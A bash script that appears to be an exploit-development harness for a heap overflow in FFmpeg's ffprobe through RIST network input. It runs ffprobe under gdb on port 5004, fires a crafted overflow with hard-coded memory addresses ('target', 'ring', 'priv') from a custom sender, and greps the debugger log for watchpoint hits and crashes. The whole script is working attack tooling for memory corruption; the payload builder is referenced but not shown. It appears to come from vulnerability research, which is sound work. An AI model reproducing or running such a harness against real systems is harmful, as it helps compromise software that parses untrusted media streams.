#!/usr/bin/env bash
# W4: structured overflow payload with sane AVFifo + wire-chosen prot target.
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
LIB="$ROOT/prefix/lib"
name=${1:-sc-file}; bin=${2:-$ROOT/plain/src/ffprobe_g}
target=${3:-0x55555584f5a0}; ring=${4:-0x5555558d1fe0}
priv=${5:-0x5555560d2100}; len=${6:-9968}
mkdir -p "$ROOT/evidence"
OUT="$ROOT/evidence/${name}.log"; SEND="$ROOT/evidence/${name}-send.log"
(env LD_LIBRARY_PATH="$LIB" MALLOC_MMAP_THRESHOLD_=16777216 \
    timeout 50 gdb -q -batch -x "$ROOT/struct-control.cmd" \
    --args "$bin" -hide_banner -loglevel verbose -f data \
    -i async:rist://@:5004 -show_packets > "$OUT" 2>&1; \
    echo "gdb rc=$?" >> "$OUT") &
gdb_pid=$!
sleep 3
(env LD_LIBRARY_PATH="$LIB" timeout 35 "$ROOT/rist_sender_struct" \
    'rist://127.0.0.1:5004' 2200 "$len" "$target" "$ring" "$priv" \
    > "$SEND" 2>&1; echo "sender rc=$?" >> "$SEND") &
sender_pid=$!
wait $sender_pid $gdb_pid
printf '%-14s %s | %s\n' "$name" \
    "$(grep -c 'SC FIRST HIT' "$OUT") watch hits" \
    "$(grep -E 'SC FIRST HIT|SC NEXT STOP|SC prot=|Breakpoint 3, file_read|SIGSEGV' "$OUT" | tr '\n' ' ')"
